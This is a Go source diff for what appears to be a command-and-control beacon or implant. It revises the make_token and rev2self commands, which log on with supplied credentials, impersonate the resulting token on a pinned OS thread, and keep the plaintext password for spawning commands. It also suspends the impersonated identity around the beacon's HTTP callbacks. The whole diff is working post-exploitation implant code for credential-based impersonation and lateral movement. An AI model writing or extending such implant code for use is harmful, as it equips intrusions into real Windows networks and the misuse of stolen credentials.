@@ -29,11 +29,12 @@ var (
 	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
 	procRevertToSelf            = advapi32.NewProc("RevertToSelf")
 
-	tokenMu        sync.Mutex
-	activeToken    syscall.Token // token handle; kept alive through rev2self for reestablishment
-	storedIdentity string        // persists through rev2self; used to restore tokenIdentity
-	tokenIdentity  string        // non-empty only when actively impersonating
-	tokenActive    bool          // true when ImpersonateLoggedOnUser has been called
+	tokenMu          sync.Mutex
+	activeToken      syscall.Token // live operator token; explicit rev2self closes it
+	storedIdentity   string        // desired operator identity while enabled
+	tokenIdentity    string        // enabled operator identity; callbacks suspend it only on their thread
+	tokenActive      bool          // operator token is enabled, not a statement about every OS thread
+	spawnCredentials struct{ domain, user, password string }
 )
 
 // makeTokenAction creates a netonly-style token and immediately impersonates
@@ -41,10 +42,12 @@ var (
 // caller). LogonUser does not validate the credentials against a domain
 // controller for this logon type, so success only proves that the token was
 // created, not that the password is correct. Stored credentials are never
-// logged or echoed; the token handle survives rev2self so the caller can
-// reestablish the impersonation after a child-process creation that may have
-// reverted it.
+// logged or echoed; temporary restoration uses the live handle, while explicit
+// rev2self permanently revokes and closes it.
 func makeTokenAction(domain, user, password string) (string, error) {
+	if identityBoundaryFault.Load() {
+		return "", errIdentityUnsafe
+	}
 	userPtr, err := syscall.UTF16PtrFromString(user)
 	if err != nil {
 		return "", fmt.Errorf("encode user: %w", err)
@@ -75,9 +78,16 @@ func makeTokenAction(domain, user, password string) (string, error) {
 	}
 	// Lock this goroutine to its OS thread so the thread token survives
 	// goroutine rescheduling. The lock is held until rev2self releases it.
-	runtime.LockOSThread()
+	tokenMu.Lock()
+	alreadyLocked := tokenActive
+	tokenMu.Unlock()
+	if !alreadyLocked {
+		runtime.LockOSThread()
+	}
 	if r, _, impErr := procImpersonateLoggedOnUser.Call(uintptr(handle)); r == 0 {
-		runtime.UnlockOSThread()
+		if !alreadyLocked {
+			runtime.UnlockOSThread()
+		}
 		_ = syscall.CloseHandle(handle)
 		return "", fmt.Errorf("ImpersonateLoggedOnUser failed: %w", impErr)
 	}
@@ -88,6 +98,7 @@ func makeTokenAction(domain, user, password string) (string, error) {
 	tokenIdentity = identity
 	storedIdentity = identity
 	tokenActive = true
+	spawnCredentials.domain, spawnCredentials.user, spawnCredentials.password = domain, user, password
 	tokenMu.Unlock()
 	if previousToken != 0 {
 		_ = previousToken.Close()
@@ -102,77 +113,76 @@ func makeTokenAction(domain, user, password string) (string, error) {
 	), nil
 }
 
-// rev2selfAction reverts thread impersonation and releases the OS-thread lock
-// so the goroutine scheduler can migrate the goroutine. The token handle is
-// kept alive so reestablishThreadToken can re-impersonate without LogonUserW.
-// storedIdentity is preserved for reestablishment display.
+// rev2selfAction permanently revokes the operator token. Temporary callback
+// suspension instead captures and restores the actual thread token separately.
 func rev2selfAction() (string, error) {
 	tokenMu.Lock()
 	defer tokenMu.Unlock()
-	if activeToken == 0 {
+	token, identity, wasActive := activeToken, tokenIdentity, tokenActive
+	if token == 0 {
 		return "no token active", nil
 	}
-	if !tokenActive {
-		return fmt.Sprintf(
-			"token already reverted (%s retained; call reestablish to restore)",
-			storedIdentity,
-		), nil
+	if wasActive {
+		if ok, _, err := procRevertToSelf.Call(); ok == 0 {
+			return "", identityBoundaryFailure(fmt.Errorf("revoke thread identity: %w", err))
+		}
 	}
-	procRevertToSelf.Call()
-	runtime.UnlockOSThread()
-	identity := tokenIdentity
-	tokenIdentity = ""
-	tokenActive = false
-	// activeToken handle is kept alive; storedIdentity is kept for reestablishment.
-	return fmt.Sprintf(
-		"token reverted: %s (handle retained; reestablishThreadToken restores impersonation)",
-		identity,
-	), nil
+	activeToken, tokenIdentity, storedIdentity, tokenActive = 0, "", "", false
+	spawnCredentials.domain, spawnCredentials.user, spawnCredentials.password = "", "", ""
+	_ = token.Close()
+	if wasActive {
+		runtime.UnlockOSThread()
+	}
+	return fmt.Sprintf("token reverted: %s; spawned commands use the agent identity", identity), nil
 }
 
-// temporarilyRevertForCallback reverts thread impersonation and releases the
-// OS-thread lock before the beacon makes its HTTP callback so the outbound
-// connection is never made under the operator network identity. This matters
-// even for plain HTTP because Windows may negotiate NTLM on behalf of the
-// goroutine's OS thread when going through an authenticating proxy.
-// The token handle is kept alive; call reestablishThreadToken after the
-// callback to restore impersonation. Lock count stays balanced: one Unlock
-// here is matched by one LockOSThread in reestablishThreadToken.
-func temporarilyRevertForCallback() {
+// suspendServerIdentity captures the actual calling thread token rather than
+// global make_token state. Keep this goroutine on the clean thread until all
+// request work, including body reads and close, has finished.
+func suspendServerIdentity() (func() error, error) {
+	runtime.LockOSThread()
+	var saved syscall.Token
+	open := advapi32.NewProc("OpenThreadToken")
+	// GetCurrentThread's pseudo handle is -2. OpenAsSelf checks access using
+	// the process identity; the returned impersonation token needs query and
+	// impersonate access for restoration through ImpersonateLoggedOnUser.
+	ok, _, openErr := open.Call(^uintptr(1), 0x0008|0x0004, 1, uintptr(unsafe.Pointer(&saved)))
+	if ok == 0 && openErr != syscall.Errno(1008) { // ERROR_NO_TOKEN is expected without impersonation.
+		// Keep an uncertain thread pinned until this goroutine terminates.
+		return nil, fmt.Errorf("capture callback thread token: %w", openErr)
+	}
+	if saved == 0 {
+		return func() error { runtime.UnlockOSThread(); return nil }, nil
+	}
+	if reverted, _, revertErr := procRevertToSelf.Call(); reverted == 0 {
+		_ = saved.Close()
+		return nil, fmt.Errorf("revert callback thread token: %w", revertErr)
+	}
+	return func() error {
+		defer runtime.UnlockOSThread()
+		defer saved.Close()
+		if restored, _, restoreErr := procImpersonateLoggedOnUser.Call(uintptr(saved)); restored == 0 {
+			return fmt.Errorf("restore callback thread token: %w", restoreErr)
+		}
+		return nil
+	}, nil
+}
+
+// reestablishThreadToken reapplies an enabled token on the calling OS thread.
+// The main command goroutine is pinned by make_token; workers must pin and clean
+// their own threads. Explicit rev2self leaves no token to reactivate.
+func reestablishThreadToken() {
+	if identityBoundaryFault.Load() {
+		return
+	}
 	tokenMu.Lock()
 	defer tokenMu.Unlock()
-	if activeToken == 0 || !tokenActive {
+	if !tokenActive || activeToken == 0 {
 		return
 	}
-	procRevertToSelf.Call()
-	runtime.UnlockOSThread()
-	tokenActive = false
-	// tokenIdentity is cleared; storedIdentity is preserved for restoration.
-	tokenIdentity = ""
-}
-
-// reestablishThreadToken re-impersonates using the retained token handle on
-// the calling goroutine's OS thread. It is a no-op when no token was set.
-// Call this after any child-process creation that may have internally called
-// RevertToSelf on the creating thread (CreateProcessAsUserW behavior).
-func reestablishThreadToken() {
-	tokenMu.Lock()
-	token := activeToken
-	identity := storedIdentity
-	alreadyActive := tokenActive
-	tokenMu.Unlock()
-	if token == 0 || alreadyActive {
-		return
+	if ok, _, err := procImpersonateLoggedOnUser.Call(uintptr(activeToken)); ok == 0 {
+		identityBoundaryFailure(fmt.Errorf("restore operator thread token: %w", err))
 	}
-	runtime.LockOSThread()
-	if r, _, _ := procImpersonateLoggedOnUser.Call(uintptr(token)); r == 0 {
-		runtime.UnlockOSThread()
-		return
-	}
-	tokenMu.Lock()
-	tokenIdentity = identity
-	tokenActive = true
-	tokenMu.Unlock()
 }
 
 // applyCommandToken gives an operator command child the active network
@@ -182,6 +192,9 @@ func reestablishThreadToken() {
 // requirement). After a call that uses SysProcAttr.Token, call
 // reestablishThreadToken to restore the creating goroutine's thread token.
 func applyCommandToken(command *exec.Cmd) {
+	if identityBoundaryFault.Load() {
+		return
+	}
 	if command.SysProcAttr == nil {
 		return
 	}
